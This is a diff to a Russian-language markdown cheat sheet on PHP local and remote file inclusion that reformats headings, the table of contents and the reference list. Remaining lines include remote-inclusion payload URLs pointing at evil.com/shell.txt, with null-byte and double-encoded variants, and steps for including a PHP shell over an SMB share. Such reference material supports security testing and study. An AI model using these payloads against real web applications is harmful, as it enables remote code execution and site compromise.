@@ -12,19 +12,18 @@ deserialization.php.swp
 .deserialization.php.swo
 deserialization.php~        # Backup copy
 
-Инструменты
-Локальное включение файлов (LFI)
-Null Byte
-Двойное кодирование
-UTF-8 кодирование
-Усечение пути
-Обход фильтров
-Удаленное включение файлов (RFI)
-Null Byte
-Двойное кодирование
-Обход allow_url_include
-Лабораторные работы
-Ссылки
+* [Инструменты](#Инструменты)
+* [Локальное включение файлов (LFI)](#Локальное-включение-файлов-(LFI))
+    * [Null Byte](#Null-Byte)
+    * [Двойное кодирование](#Двойное-кодирование)
+    * [UTF-8 кодирование](#UTF-8-кодирование)
+    * [Усечение пути](#Усечение-пути)
+    * [Обход фильтров](#Обход-фильтров)
+* [Удаленное включение файлов (RFI)](#Удаленное-включение-файлов-(RFI))
+    * [Null Byte RFI](#Null-Byte-RFI)
+    * [Двойное кодирование RFI](#Двойное-кодирование-RFI)
+    * [Обход allow_url_include](#Обход-allow_url_include) 
+* [URL](#URL)
 
 
 > Уязвимость включения файлов - это тип уязвимости безопасности в веб-приложениях, особенно распространенный в приложениях, разработанных на PHP, где злоумышленник может включить файл, используя недостаточную проверку входных/выходных данных. Эта уязвимость может привести к различным вредоносным действиям, включая выполнение кода, кражу данных и изменение содержимого веб-сайта.
@@ -128,14 +127,14 @@ allow_url_include = On
 http://example.com/index.php?page=http://evil.com/shell.txt
 ```
 
-# Null Byte
+# Null Byte RFI
 
 ```text
 
 http://example.com/index.php?page=http://evil.com/shell.txt%00
 ```
 
-# Двойное кодирование
+# Двойное кодирование RFI
 
 ```text
 
@@ -144,34 +143,16 @@ http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
 
 # Обход allow_url_include
 
-Когда allow_url_include и allow_url_fopen установлены в Off. Все еще возможно включить удаленный файл на Windows машине с использованием протокола smb.
+* Когда allow_url_include и allow_url_fopen установлены в Off. Все еще возможно включить удаленный файл на Windows машине с использованием протокола smb.
 
-    Создайте общедоступную общую папку
+1. Создайте общедоступную общую папку
+2. Напишите PHP код внутри файла: shell.php
+3. Включите его: http://example.com/index.php?page=\\10.0.0.1\share\shell.php
 
-    Напишите PHP код внутри файла: shell.php
+# URL
 
-    Включите его: http://example.com/index.php?page=\\10.0.0.1\share\shell.php
+* [CVV #1: Local File Inclusion - SI9INT - 20 июня 2018](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
+* [Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction - Mannu Linux - 12 мая 2019](https://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
+* [LFI Cheat Sheet - @Arr0way - 24 апреля 2016](https://highon.coffee/blog/lfi-cheat-sheet/)
 
-Лабораторные работы
-
-    Root Me - Локальное включение файлов
-
-    Root Me - Локальное включение файлов - Двойное кодирование
-
-    Root Me - Удаленное включение файлов
-
-    Root Me - PHP - Фильтры
-
-Ссылки
-
-    CVV #1: Local File Inclusion - SI9INT - 20 июня 2018
-
-    Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction - Mannu Linux - 12 мая 2019
-
-    Is PHP vulnerable and under what conditions? - 13 апреля 2015 - Andreas Venieris
-
-    LFI Cheat Sheet - @Arr0way - 24 апреля 2016
-
-    Testing for Local File Inclusion - OWASP - 25 июня 2017
-
-    Turning LFI into RFI - Grayson Christopher - 14 августа 2017
+   
